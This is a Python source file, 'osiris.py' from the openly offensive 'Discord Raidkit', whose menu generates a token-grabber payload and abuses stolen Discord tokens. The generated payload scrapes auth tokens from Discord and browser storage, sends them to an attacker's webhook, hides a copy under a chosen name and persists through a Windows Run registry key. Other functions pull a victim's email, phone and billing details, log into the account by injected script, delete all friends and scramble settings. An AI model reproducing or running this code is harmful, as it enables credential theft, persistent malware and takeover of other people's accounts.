"""
Discord Raidkit v2.3.4 — "The trojan horse of discord raiding"
Copyright © 2023 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

osiris.py stores the Osiris program for Discord Raidkit.
osiris.py was last updated on 21/04/23 at 01:53 UTC.
"""

import os
from abc import ABC, abstractmethod
from time import sleep

import requests
from colorama import Fore
from selenium import webdriver
from selenium.common.exceptions import WebDriverException
from selenium.webdriver import ActionChains
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager
from webdriver_manager.microsoft import EdgeChromiumDriverManager

import utils.log_utils as lu
from utils.io_utils import valid_input

lu.init()

class LoginAction(ABC):
    @abstractmethod
    def execute(self, driver) -> str:
        pass


class LoginActionNone(LoginAction):
    def execute(self, driver) -> str:
        return 'Logged into user account successfully'


class LoginActionRemoveFriends(LoginAction):
    def execute(self, driver) -> str:
        driver.find_element(By.XPATH, "//div[@role='tab'][contains(text(),'All')]").click()
        people = driver.find_elements(By.XPATH, "//div[@data-list-id='people'] //div[@role='listitem']")
        action = ActionChains(driver)
        for person in people:
            action.context_click(person).perform()
            driver.find_element(By.ID, 'user-context-remove-friend').click()
            driver.find_element(By.XPATH, "//button[@type='submit']").click()
            sleep(0.5)
        return 'Removed all friends from user account successfully'


class Osiris:
    
    __slots__ = ('auth', 'hint')
    
    def __init__(self) -> None:
        self.auth = ''
        self.hint = ''
        return

    def run(self) -> None:
        while True:
            match valid_input(f"""{Fore.LIGHTGREEN_EX}Welcome to Discord Raidkit's Osiris!

{Fore.LIGHTBLUE_EX}[1] Generate Discord token grabber
[2] Get a Discord account's details
[3] Log into a discord account
[4] Log into a discord account and remove all friends
[5] Nuke a discord account
{Fore.RED}[6] Exit

{Fore.LIGHTWHITE_EX}{self.hint}

{Fore.LIGHTGREEN_EX}>>> {Fore.LIGHTWHITE_EX}""", {'1', '2', '3', '4', '5', '6'}, True):
                case '1':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.hint = self.generate_grabber() 
                case '2':
                    print('Enter a user authentication token: ', end='')
                    self.auth = input()
                    self.hint = self.get_account_info()
                case '3':
                    print('Enter a user authentication token: ', end='')
                    self.auth = input()
                    self.hint = self.login(LoginActionNone())
                case '4':
                    print('Enter a user authentication token: ', end='')
                    self.auth = input()
                    self.hint = self.login(LoginActionRemoveFriends())
                case '5':
                    print('Enter a user authentication token: ', end='')
                    self.auth = input()
                    self.hint = self.nuke_account()
                case '6':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    break 

    @staticmethod
    def generate_grabber() -> str:

        def get_generate_code(s_webhook: str, s_folder: str, s_hpayload: str, do_reg_key: bool) -> str:
            """Get code to generate token grabber payload.

            Returns:
                str: code to generate token grabber payload.

            Credits:
            - wodxgod: created logic to grab discord tokens
            - Microsoft: lets me write to registry keys without administrator
            """

            generated_code = r'''
import os
import json
import os
import re
import shutil
import winreg
from urllib.request import Request, urlopen

PAYLOAD_PATH = os.path.realpath(__file__)
WEBHOOK_URL = "''' + s_webhook + r'''"


def set_autostart_registry(app_name, key_data=None, autostart=True) -> bool:
    with winreg.OpenKey(
        key=winreg.HKEY_CURRENT_USER,
        sub_key=r"Software\Microsoft\Windows\CurrentVersion\Run",
        reserved=0,
        access=winreg.KEY_ALL_ACCESS
    ) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
            else:
                winreg.DeleteValue(key, app_name)
        except OSError:
            return False
    return True


def find_tokens(path) -> list:
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
    
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    
    return tokens


def main():
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = "@everyone"
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
    
        message += f"\n**{platform}**\n"
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f"{token}\n"
        else:
            message += "No tokens found.\n"
        
        message += "\n"
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    payload = json.dumps({"content": message})
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass


if __name__ == "__main__":
    path = fr"C:\Users\{os.getenv('username')}''' + f'''\{s_folder}''' + r'''"
    if not os.path.isdir(path):
        os.mkdir(path)
    file = "''' + s_hpayload + r'''.pyw"
    try:
        shutil.copy(__file__, f"{path}\{file}")
    except shutil.SameFileError:
        pass
    '''
            if do_reg_key:
                generated_code += r'''set_autostart_registry("Osiris", f"{path}\{file}")
    '''
            generated_code += r'''main()
'''
            return generated_code

        def write_payload(payload: str, s_rpayload: str) -> None:
            """Writes the token grabber payload file
            """
            if not os.path.isdir("payloads"):
                os.mkdir("payloads")

            with open(f"payloads/{s_rpayload}.pyw", "w") as f:
                f.write(payload)

            return

        try:
            webhook = input('Please enter a discord webhook: ')
            folder = input(
                'Please enter a folder name (this folder will be created on the target\'s computer, containing '
                'another payload): ')
            rpayload = input(
                'Please enter the regular payload name (this is the payload the target will knowingly run): ')
            hpayload = input(
                'Please enter the hidden payload name (this is the payload the target will unknowingly run if '
                'registry key is enabled): ')
            do_reg_keg = input(
                'Enter 1 to enable registry keys (will let the payload run every time the target logs into Windows): ')

            match do_reg_keg:
                case '1':
                    do_reg_keg = True
                case _:
                    do_reg_keg = False
                    
            try:
                os.mkdir(folder)
                os.rmdir(folder)
                open(rpayload + ".txt", "w").close()
                os.remove(rpayload + ".txt")
                open(hpayload + ".txt", "w").close()
                os.remove(hpayload + ".txt")
            except OSError:
                return 'Some options entered had invalid Windows names!'

            code = get_generate_code(webhook, folder, hpayload, do_reg_keg)
            write_payload(code, rpayload)
            return 'Successfully generated payload!'

        except Exception as e:
            lu.serror(lu.F_OSIRIS, 'Osiris.generate_grabber', f'Uncaught error: {e}')
            return f'Error in osiris.py - generate_grabber(): {e}'

    def get_account_info(self) -> str:
        check, std_response = self.check_auth()
        if check:
            user_name = f'{std_response.json()["username"]}#{std_response.json()["discriminator"]}'
            user_id = std_response.json()["id"]
            phone = std_response.json()["phone"]
            email = std_response.json()["email"]
            mfa = std_response.json()["mfa_enabled"]
            
            # Spacing: "[...] x" <= "[...] " = 20 characters
            # i.e. x always starts at 20th character
            
            info = f'''Account Information
{"*"*19}

[User ID]{' '*11}{user_id}
[User Name]{' '*9}{user_name}
[2 Factor]{' '*10}{mfa}
[Email]{' '*13}{email}
[Phone number]{' '*6}{phone if phone else ''}'''
            
            headers = {"Authorization": self.auth, "Content-Type": "application/json"}
            bill_sources_response = requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            user_has_nitro = bool(requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions',  headers=headers).json())
            
            if bool(bill_sources_response):
                info += f'\n\nBilling Information\n{"*"*19}\n\n'
                for source_data in bill_sources_response:
                    info += f'[Has Nitro]{" "*9}{"Yes" if user_has_nitro else "No"}\n'
                    
                    match source_data['type']:
                        case 1:
                            info += f'[Card Brand]{" "*8}{source_data["brand"]}\n'
                            info += f'[Last 4 Digits]{" "*5}{source_data["last_4"]}\n'
                            info += f'[Expiry Date]{" "*7}{source_data["expires_month"]}/{source_data["expires_year"]}\n'
                            info += f'[Billing Name]{" "*6}{source_data["billing_address"]["name"]}\n'
                            info += f'[Address ln.1]{" "*6}{source_data["billing_address"]["line_1"]}\n'
                            info += f'[Address ln.2]{" "*6}{source_data["billing_address"]["line_2"]}\n'
                            info += f'[Country]{" "*11}{source_data["billing_address"]["country"]}\n'
                            info += f'[State]{" "*13}{source_data["billing_address"]["state"]}\n'
                            info += f'[City]{" "*14}{source_data["billing_address"]["city"]}\n'
                            info += f'[Postal Code]{" "*13}{source_data["billing_address"]["postal_code"]}\n\n'
                        case 2:
                            info += f'[PayPal Email]{" "*6}{source_data["email"]}\n'
                            info += f'[Billing Name]{" "*6}{source_data["billing_address"]["name"]}\n'
                            info += f'[Address ln.1]{" "*6}{source_data["billing_address"]["line_1"]}\n'
                            info += f'[Address ln.2]{" "*6}{source_data["billing_address"]["line_2"]}\n'
                            info += f'[Country]{" "*11}{source_data["billing_address"]["country"]}\n'
                            info += f'[State]{" "*13}{source_data["billing_address"]["state"]}\n'
                            info += f'[City]{" "*14}{source_data["billing_address"]["city"]}\n'
                            info += f'[Postal Code]{" "*7}{source_data["billing_address"]["postal_code"]}\n\n'
                        case _:
                            info += 'None'
                info += f'\n[Token]{" "*13}{self.auth}'
            return info
        else:
            return 'User authentication token is not valid!'

    def check_auth(self) -> tuple:
        headers = {"Authorization": self.auth,
                   "Content-Type": "application/json"}

        r = requests.get(
            'https://discord.com/api/v6/users/@me', headers=headers)

        if r.status_code == 200:
            return True, r
        return False, False

    def login(self, login_action: LoginAction) -> str:
        try:
            if self.check_auth()[0]:
                browser = valid_input('''Enter a compatible browser: 

[1] Chrome
[2] Firefox
[3] Edge
[4] Cancel

>>> ''', {'1', '2', '3', '4'}, True)
                match browser:
                    case '1':
                        from selenium.webdriver.chrome.options import Options
                        chrome_options = Options()
                        chrome_options.add_experimental_option('detach', True)
                        chrome_options.add_argument('--log-level=3')
                        driver = webdriver.Chrome(executable_path=ChromeDriverManager().install(), options=chrome_options)
                    case '2':
                        from selenium.webdriver.firefox.options import Options
                        firefox_options = Options()
                        firefox_options.set_preference('detach', True)
                        firefox_options.add_argument('--log-level=3')
                        driver = webdriver.Firefox(executable_path=GeckoDriverManager().install(), options=firefox_options)
                    case '3':
                        from selenium.webdriver.edge.options import Options
                        edge_options = Options()
                        edge_options.add_experimental_option('detach', True)
                        edge_options.add_argument('--log-level=3')
                        driver = webdriver.Edge(executable_path=EdgeChromiumDriverManager().install(), options=edge_options)
                    case '4':
                        return ''

                driver.implicitly_wait(30)
                driver.get('https://discord.com/login')
                
                WebDriverWait(driver, 30).until(EC.visibility_of_element_located((By.XPATH, "//h1[contains(text(),'Welcome back!')]")))
                
                script = """
                            function login(token) {
                            setInterval(() => {
                            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                            }, 50);
                            setTimeout(() => {
                            location.reload();
                            }, 2500);
                            }
                            """
                driver.execute_script(script + f'\nlogin("{self.auth}")')

                return login_action.execute(driver)
            else:
                return 'User authentication token is not valid!'
        except WebDriverException as e:
            lu.serror(lu.F_OSIRIS, 'Osiris.login', f"WebDriver Exception: {e}")
            return f"WebDriverException: {e}"
        except Exception as e:
            lu.serror(lu.F_OSIRIS, 'Osiris.login', f'Uncaught error: {e}')
            return f'Error in osiris.py - login(): {e}'

    def nuke_account(self) -> str:

        def nuke_request(headers) -> None:
            
            settings = {
                "locale": "ja",
                "show_current_game": False,
                "default_guilds_restricted": True,
                "inline_attatchment_media": False,
                "inline_embed_media": False,
                "gif_auto_play": False,
                "render_embeds": False,
                "render_reactions": False,
                "animate_emoji": False,
                "enable_tts_command": False,
                "message_display_compact": True,
                "convert_emoticons": False,
                "explicit_content_filter": 0,
                "disable_games_tab": True,
                "theme": "light",
                "detect_platform_accounts": False,
                "stream_notifications_enabled": False,
                "animate_stickers": False,
                "view_nsfw_guilds": True,
            }

            requests.patch(
                "https://discord.com/api/v10/users/@me/settings",
                headers=headers,
                json=settings
            )

        try:
            if self.check_auth()[0]:
                print('\nNuking account... this may take a while...')

                headers = {
                    "Authorization": f"{self.auth}",
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/json"
                }
                nuke_request(headers)
                return 'User nuked successfully'
            else:
                return 'User authentication token is not valid!'
        except Exception as e:
            lu.serror(lu.F_OSIRIS, 'Osiris.nuke_account', f'Uncaught error: {e}')
            return f'Error in osiris.py - nuke_account(): {e}'
